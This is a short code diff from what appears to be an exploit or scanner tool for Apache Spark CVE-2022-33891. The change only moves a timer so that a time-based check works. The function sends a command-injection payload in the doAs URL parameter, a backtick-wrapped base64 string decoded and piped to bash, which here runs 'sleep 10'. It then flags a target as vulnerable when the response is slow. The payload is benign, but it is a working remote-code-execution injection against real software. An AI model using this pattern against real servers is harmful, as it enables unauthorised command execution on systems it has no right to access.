@@ -7,8 +7,8 @@ from ttkbootstrap.constants import *
 def apache_spark_cve_2022_33891_exp(target_url):
     targeturl = f'{target_url}/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`'
     try:
+        t1 = datetime.datetime.now()        
         res = requests.post(url=targeturl, verify=False, timeout=20, allow_redirects=False)
-        t1 = datetime.datetime.now()
         t2 = datetime.datetime.now()
         delta = t2 - t1
         if delta.seconds < 10:
